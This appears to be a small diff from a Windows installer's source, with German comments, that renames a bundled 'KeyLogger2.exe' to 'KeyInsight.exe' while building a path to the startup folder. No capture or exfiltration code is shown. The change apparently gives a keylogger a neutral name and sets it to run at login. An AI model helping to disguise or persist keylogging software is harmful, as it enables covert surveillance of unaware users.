@@ -79,9 +79,9 @@ int getDetails(){
         return 1;
     }
 
-    // Pfad zu KeyLogger2.exe (im selben Ordner wie setup.exe)
+    // Pfad zu KeyInsight.exe (im selben Ordner wie setup.exe)
     WCHAR KeyInsightPath[MAX_PATH];
-    swprintf_s(KeyInsightPath, MAX_PATH, L"%s\\KeyLogger2.exe", workingDirectoryPath);
+    swprintf_s(KeyInsightPath, MAX_PATH, L"%s\\KeyInsight.exe", workingDirectoryPath);
 
     // Pfad zum Autostart-Ordner
     WCHAR startupPath[MAX_PATH];
